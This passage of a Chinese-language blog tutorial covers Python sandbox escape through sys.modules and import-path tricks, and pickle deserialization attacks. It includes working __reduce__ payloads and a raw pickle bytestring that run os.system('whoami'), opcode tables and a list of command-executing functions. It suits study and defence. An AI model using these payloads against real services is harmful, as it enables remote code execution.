class="line"> <span class="string">&#x27;site&#x27;</span>: &lt;module <span class="string">&#x27;site&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/site.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;__builtin__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;sysconfig&#x27;</span>: &lt;module <span class="string">&#x27;sysconfig&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sysconfig.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;__main__&#x27;</span>: &lt;module <span class="string">&#x27;__main__&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.encodings&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;abc&#x27;</span>: &lt;module <span class="string">&#x27;abc&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/abc.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;posixpath&#x27;</span>: &lt;module <span class="string">&#x27;posixpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/posixpath.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_weakrefset&#x27;</span>: &lt;module <span class="string">&#x27;_weakrefset&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/_weakrefset.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;errno&#x27;</span>: &lt;module <span class="string">&#x27;errno&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.codecs&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;sre_constants&#x27;</span>: &lt;module <span class="string">&#x27;sre_constants&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_constants.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;re&#x27;</span>: &lt;module <span class="string">&#x27;re&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/re.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_abcoll&#x27;</span>: &lt;module <span class="string">&#x27;_abcoll&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/_abcoll.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;types&#x27;</span>: &lt;module <span class="string">&#x27;types&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/types.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_codecs&#x27;</span>: &lt;module <span class="string">&#x27;_codecs&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.__builtin__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;_warnings&#x27;</span>: &lt;module <span class="string">&#x27;_warnings&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;genericpath&#x27;</span>: &lt;module <span class="string">&#x27;genericpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/genericpath.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;stat&#x27;</span>: &lt;module <span class="string">&#x27;stat&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/stat.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;zipimport&#x27;</span>: &lt;module <span class="string">&#x27;zipimport&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;_sysconfigdata&#x27;</span>: &lt;module <span class="string">&#x27;_sysconfigdata&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/_sysconfigdata.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;warnings&#x27;</span>: &lt;module <span class="string">&#x27;warnings&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/warnings.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;UserDict&#x27;</span>: &lt;module <span class="string">&#x27;UserDict&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/UserDict.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;glob&#x27;</span>: &lt;module <span class="string">&#x27;glob&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/glob.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.utf_8&#x27;</span>: &lt;module <span class="string">&#x27;encodings.utf_8&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/encodings/utf_8.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;sys&#x27;</span>: &lt;module <span class="string">&#x27;sys&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;fnmatch&#x27;</span>: &lt;module <span class="string">&#x27;fnmatch&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/fnmatch.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;imp&#x27;</span>: &lt;module <span class="string">&#x27;imp&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;codecs&#x27;</span>: &lt;module <span class="string">&#x27;codecs&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/codecs.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;readline&#x27;</span>: &lt;module <span class="string">&#x27;readline&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/lib-dynload/readline.x86_64-linux-gnu.so&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_sysconfigdata_nd&#x27;</span>: &lt;module <span class="string">&#x27;_sysconfigdata_nd&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu/_sysconfigdata_nd.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;os.path&#x27;</span>: &lt;module <span class="string">&#x27;posixpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/posixpath.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_locale&#x27;</span>: &lt;module <span class="string">&#x27;_locale&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;sitecustomize&#x27;</span>: &lt;module <span class="string">&#x27;sitecustomize&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sitecustomize.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;signal&#x27;</span>: &lt;module <span class="string">&#x27;signal&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;traceback&#x27;</span>: &lt;module <span class="string">&#x27;traceback&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/traceback.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;linecache&#x27;</span>: &lt;module <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/linecache.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;posix&#x27;</span>: &lt;module <span class="string">&#x27;posix&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.aliases&#x27;</span>: &lt;module <span class="string">&#x27;encodings.aliases&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/encodings/aliases.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;exceptions&#x27;</span>: &lt;module <span class="string">&#x27;exceptions&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;sre_parse&#x27;</span>: &lt;module <span class="string">&#x27;sre_parse&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_parse.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;os&#x27;</span>: &lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_weakref&#x27;</span>: &lt;module <span class="string">&#x27;_weakref&#x27;</span> (built-<span class="keyword">in</span>)&gt;&#125;</span><br></pre></td></tr></table></figure><p>如果我们修改掉os模块的路径，那么就无法使用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>importlib.import_module(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;importlib/__init__.py&quot;</span>, line <span class="number">37</span>, <span class="keyword">in</span> import_module</span><br><span class="line">    <span class="built_in">__import__</span>(name)</span><br><span class="line">ImportError: No module named os</span><br></pre></td></tr></table></figure><p>但是我们可以手动的在加上去</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><h4 id="文件或者模块全被删除"><a href="#文件或者模块全被删除" class="headerlink" title="文件或者模块全被删除"></a>文件或者模块全被删除</h4><p>最极端的方式就是os、sys、reload模块都被干掉了，usr等目录被限制了权限，那么我们就可以使用Python加载模块的先后顺序的方式</p><div class="note success modern"><p>当前目录 -&gt; sys.path列表中的其他目录</p></div><p>查看内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line">[<span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-tk&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-old&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-dynload&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>]</span><br></pre></td></tr></table></figure><p>只需要把文件上传到当前文件同级目录就可以直接import os使用</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>将对象转换为可通过网络传输或可以存储到本地磁盘的数据格式（如：XML、JSON或特定格式的字节串）的过程称为序列化；反之，则称为反序列化。如果用户反序列化一些不改反序列化的东西，那么就会照成漏洞</p><div class="table-container"><table><thead><tr><th>模块名称</th><th>描述</th><th>提供的api</th></tr></thead><tbody><tr><td>pickle</td><td>用于实现Python数据类型与Python特定二进制格式之间的转换</td><td>dumps()、dump()、loads()、load()</td></tr><tr><td>json</td><td>用于实现Python数据类型与通用（json）字符串之间的转换</td><td>dumps()、dump()、loads()、load()</td></tr><tr><td>shelve</td><td>专门用于将Python数据类型的数据持久化到磁盘，shelve是一个类似dict的对象，操作十分便捷</td><td>open()</td></tr></tbody></table></div><p>能够利用的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads</span><br><span class="line">pickle.load</span><br><span class="line">pickle.Unpickler  <span class="comment"># 像一个代理类一样，在序列化前进行处理，进行安全过滤之类的</span></span><br><span class="line">cPickle.loads</span><br><span class="line">cPickle.load</span><br><span class="line">cPickle.Unpickler  <span class="comment"># 像一个代理类一样，在序列化前进行处理，进行安全过滤之类的</span></span><br><span class="line">shelve.<span class="built_in">open</span></span><br><span class="line">marshal.load</span><br><span class="line">marshal.loads</span><br></pre></td></tr></table></figure><h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><p>序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 字节流</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>反序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 字节流</span></span><br><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><blockquote><p>pickle.Unpickler像一个代理类一样，在序列化前进行处理，进行安全过滤之类的。</p></blockquote><p>Python2标准库中有<code>pickle</code>和<code>cPickle</code>，Python3中只有前者。</p><p>pickle由于有不同的实现版本，目前有6个版本，但是pickle可以向下兼容（所以用v0就可以在所有版本中执行），目前pickle只有6个版本。</p><p>如果python2中的序列化文件如果想在python3中读取，需要修改编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选定pickle版本</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"><span class="comment"># python2读取文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    l = <span class="built_in">list</span>(pickle.load(f))</span><br><span class="line"><span class="comment"># python3读取文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    u = pickle._Unpickler(f)</span><br><span class="line">    u.encoding = <span class="string">&#x27;latin1&#x27;</span></span><br><span class="line">    p = u.load()</span><br></pre></td></tr></table></figure><p><code>pickle</code>允许任意对象通过定义<code>__reduce__</code>方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__reduce__</span><br><span class="line">被定义之后，当对象被Pickle时就会被调用</span><br><span class="line">要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含<span class="number">2</span>到<span class="number">5</span>个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用</span><br><span class="line">__reduce_ex__</span><br><span class="line">首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__</span><br></pre></td></tr></table></figure><p>编写漏洞代码<code>__reduce__</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">a=test()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><p>如果使用的是<code>__reduce_ex__</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cmd</span>):</span><br><span class="line">        self.cmd = cmd</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce_ex__</span>(<span class="params">self,cmd</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(self.cmd,))</span><br><span class="line">a=test(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><blockquote><p>其中<code>pickle.loads</code>是会解决import问题，对于未引入的module会自动尝试import。</p></blockquote><p>比如说我们直接执行代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle;pickle.loads(<span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>内置能够执行命令的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>,execfile,<span class="built_in">compile</span>,<span class="built_in">open</span>,file,<span class="built_in">map</span>,<span class="built_in">input</span>,os.system,os.popen,os.popen2,os.popen3,os.popen4,os.<span class="built_in">open</span>,os.pipe,os.listdir,os.access,os.execl,os.execle,os.execlp,os.execlpe,os.execv,os.execve,os.execvp,os.execvpe,os.spawnl,os.spawnle,os.spawnlp,os.spawnlpe,os.spawnv,os.spawnve,os.spawnvp,os.spawnvpe,pickle.load,pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.<span class="built_in">open</span>,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.<span class="built_in">open</span>,posixfile.fileopen,platform.popen</span><br></pre></td></tr></table></figure><h5 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h5><p>不同的操作码对应不同的动作，接下来开始学习PVM是如何运作opcode的。我们需要知道的是：<strong>PVM引擎会识别opcode中不同的指令码，从而进行相应的操作。</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">data=<span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>name</th><th>op</th><th>params</th><th>describe</th><th>e.g.</th></tr></thead><tbody><tr><td>MARK</td><td>(</td><td>null</td><td>向栈顶push一个MARK</td><td></td></tr><tr><td>STOP</td><td>.</td><td>null</td><td>结束</td><td></td></tr><tr><td>POP</td><td>0</td><td>null</td><td>丢弃栈顶第一个元素</td><td></td></tr><tr><td>POP_MARK</td><td>1</td><td>null</td><td>丢弃栈顶到MARK之上的第一个元素</td><td></td></tr><tr><td>DUP</td><td>2</td><td>null</td><td>在栈顶赋值一次栈顶元素</td><td></td></tr><tr><td>FLOAT</td><td>F</td><td>F [float]</td><td>push一个float</td><td>F1.0</td></tr><tr><td>INT</td><td>I</td><td>I [int]</td><td>push一个integer</td><td>I1</td></tr><tr><td>NONE</td><td>N</td><td>null</td><td>push一个None</td><td></td></tr><tr><td>REDUCE</td><td>R</td><td>[callable] [tuple] R</td><td>调用一个callable对象</td><td>crandom\nRandom\n)R</td></tr><tr><td>STRING</td><td>S</td><td>S [string]</td><td>push一个string</td><td>S ‘x’</td></tr><tr><td>UNICODE</td><td>V</td><td>V [unicode]</td><td>push一个unicode string</td><td>V ‘x’</td></tr><tr><td>APPEND</td><td>a</td><td>[list] [obj] a</td><td>向列表append单个对象</td><td>]I100\na</td></tr><tr><td>BUILD</td><td>b</td><td>[obj] [dict] b</td><td>添加实例属性（修改<code>__dict__</code>）</td><td>cmodule\nCls\n)R(I1\nI2\ndb</td></tr><tr><td>GLOBAL</td><td>c</td><td>c [module] [name]</td><td>调用Pickler的<code>find_class</code>，导入module.name并push到栈顶</td><td>cos\nsystem\n</td></tr><tr><td>DICT</td><td>d</td><td>MARK [[k] [v]…] d</td><td>将栈顶MARK以前的元素弹出构造dict，再push回栈顶</td><td>(I0\nI1\nd</td></tr><tr><td>EMPTY_DICT</td><td>}</td><td>null</td><td>push一个空dict</td><td></td></tr><tr><td>APPENDS</td><td>e</td><td>[list] MARK [obj…] e</td><td>将栈顶MARK以前的元素append到前一个的list</td><td>](I0\ne</td></tr><tr><td>GET</td><td>g</td><td>g [index]</td><td>从memo获取元素</td><td>g0</td></tr><tr><td>INST</td><td>i</td><td>MARK [args…] i [module] [cls]</td><td>构造一个类实例（其实等同于调用一个callable对象），内部调用了<code>find_class</code></td><td>(S’ls’\nios\nsystem\n</td></tr><tr><td>LIST</td><td>l</td><td>MARK [obj] l</td><td>将栈顶MARK以前的元素弹出构造一个list，再push回栈顶</td><td>(I0\nl</td></tr><tr><td>EMPTY_LIST</td><td>]</td><td>null</td><td>push一个空list</td><td></td></tr><tr><td>OBJ</td><td>o</td><td>MARK [callable] [args…] o</td><td>同INST，参数获取方式由readline变为stack.pop而已</td><td>(cos\nsystem\nS’ls’\no</td></tr><tr><td>PUT</td><td>p</td><td>p [index]</td><td>将栈顶元素放入memo</td><td>p0</td></tr><tr><td>SETITEM</td><td>s</td><td>[dict] [k] [v] s</td><td>设置dict的键值</td><td>}I0\nI1\ns</td></tr><tr><td>TUPLE</td><td>t</td><td>MARK [obj…] t</td><td>将栈顶MARK以前的元素弹出构造tuple，再push回栈顶</td><td>(I0\nI1\nt</td></tr><tr><td>EMPTY_TUPLE</td><td>)</td><td>null</td><td>push一个空tuple</td><td></td></tr><tr><td>SETITEMS</td><td>u</td><td>[dict] MARK [[k] [v]…] u</td><td>将栈顶MARK以前的元素弹出update到前一个dict</td><td>}(I0\nI1\nu</td></tr></tbody></table></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/5.gif" alt="image-20220509001219887"></p><p>三种常见的操作符R（<strong>可以执行命令</strong>）、i（<strong>可以执行命令</strong>）、o（<strong>可以执行命令</strong>），还有一些不常见的c（<strong>可以进行变量覆盖</strong>）、b（<strong>可以执行命令</strong>）等，三种常见的如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>)         =&gt;  (S<span class="string">&#x27;ls&#x27;</span>\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>), <span class="string">&#x27;ls&#x27;</span>)  =&gt;  (cos\nsystem\nS<span class="string">&#x27;ls&#x27;</span>\no</span><br></pre></td></tr></table></figure><div class="note success modern"><p><code>R</code>操作符</p></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Evil(),protocol=<span class="number">0</span>))  <span class="comment"># protocol表示协议版本</span></span><br><span class="line">pickletools.dis(pickle.dumps(Evil(),protocol=<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>输入的内容如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;cos\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line">   <span class="number">11</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">14</span>: (    MARK</span><br><span class="line">   <span class="number">15</span>: V        UNICODE    <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">23</span>: p        PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">26</span>: t        TUPLE      (MARK at <span class="number">14</span>)</span><br><span class="line">   <span class="number">27</span>: p    PUT        <span class="number">2</span></span><br><span class="line">   <span class="number">30</span>: R    REDUCE</span><br><span class="line">   <span class="number">31</span>: p    PUT        <span class="number">3</span></span><br><span class="line">   <span class="number">34</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看见opcode第一行导入的是一个<code>os system</code>，这是Linux上的。如果想要在Windows上面使用的话，就得导入<code>nt system</code>模块。如果要避免这种限制需要使用通过AST来构造opcode。<a href="https://github.com/eddieivan01/pker">下载</a> <a href="https://github.com/Ascotbe/Image/blob/master/CodeAudit/Python/pker.zip">备份</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># text.txt</span></span><br><span class="line"><span class="comment"># 重载了__import__ os，不然如果使用安全函数是无法自动导入包的</span></span><br><span class="line">os = GLOBAL(<span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">system = GLOBAL(<span class="string">&#x27;__builtin__&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>)(os, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>输入命令<code>python3 pker.py &lt; text.txt</code>即可生成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span 